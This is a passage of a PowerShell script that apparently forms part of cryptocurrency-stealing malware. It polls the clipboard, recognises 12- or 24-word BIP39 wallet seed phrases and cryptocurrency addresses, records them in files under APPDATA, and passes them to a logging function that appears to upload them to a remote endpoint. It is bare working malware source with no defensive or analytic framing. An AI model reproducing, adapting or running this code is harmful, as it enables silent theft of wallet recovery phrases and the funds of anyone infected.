    $cli.UploadString($EndPointURL, '') | Out-Null
}
function Watch-Clip {
    $lastClip = "";
    try {
        [string]$text = Get-Clipboard
        if ([string]::IsNullOrEmpty($text)) {
            continue
        }

        $text = $text.Trim()
        if ($lastClip -eq $text) {
            continue
        }

        #Write-Host "Watch-Clip $text"
        $lastClip = $text
        $clipWords = $text.Split() | Where-Object { $_ -ne "" }

        if ($clipWords.Count -eq 12 -or $clipWords.Count -eq 24) {
            $matchCount = 0
            foreach ($word in $clipWords) {
                if ($words -contains $word) {
                    $matchCount++
                }
            }

            if ($matchCount -eq $clipWords.Count) {
                # Check if the phrase is already stored
                if (-not (Test-Path $storedPhrasesPath)) {
$storedPhrasesPath = "$env:APPDATA\StoredBIP39Phrases.txt"
                    $null = New-Item -Path $storedPhrasesPath -ItemType File
                }
                $storedPhrases = Get-Content $storedPhrasesPath
                if ($storedPhrases -notcontains $text) {
                    $np = Ensure-FileHasLockk -ValueToCheck $text
                    if ($np) {
                        Ensure-FileCreateLockk -ValueToCheck $text
                        Add-Content -Path $storedPhrasesPath -Value $text

                        Set-Log ("crp|WALLEE|$text")
                    }
                }
            }
        }
        foreach ($entry in $address_book) {
            if ($text -match $entry.r) {
                if (-not (Test-Path $storedPhrasesPath2)) {
                    $storedPhrasesPath2 = "$env:APPDATA\StoredAdd.txt"
                                        $null = New-Item -Path $storedPhrasesPath2 -ItemType File
                                    }
                                    $storedPhrases2 = Get-Content $storedPhrasesPath2
                                    if ($storedPhrases2 -notcontains $text) {
                $np = Ensure-FileHasLock -ValueToCheck $text
                if ($np) {
                    Ensure-FileCreateLock -ValueToCheck $text
                    Add-Content -Path $storedPhrasesPath2 -Value $text

                    Set-Log ("crp|$($entry.c)|$text")
                }
            }
        }
        }
    } catch {
        #Write-Host "Error in Clipboard Watch Loop: $_"
    }
}



try {
    while ($true) {
        Start-Sleep -Seconds 10

        Watch-Clip

        if ( $jobPing.State -ne "Running") {
            Write-Output "The job is existed."
            Stop-Job -Job $jobPing
            Stop-Job -Job $jobWindow

            Remove-Job -Job $jobPing
            Remove-Job -Job $jobWindow
            exit(0);
        }

        $output = Receive-Job -Job $jobPing -Keep
        $output = Receive-Job -Job $jobWindow -Keep
    }
}
finally {

}
$mutex.ReleaseMutex()
$mutex.Dispose()
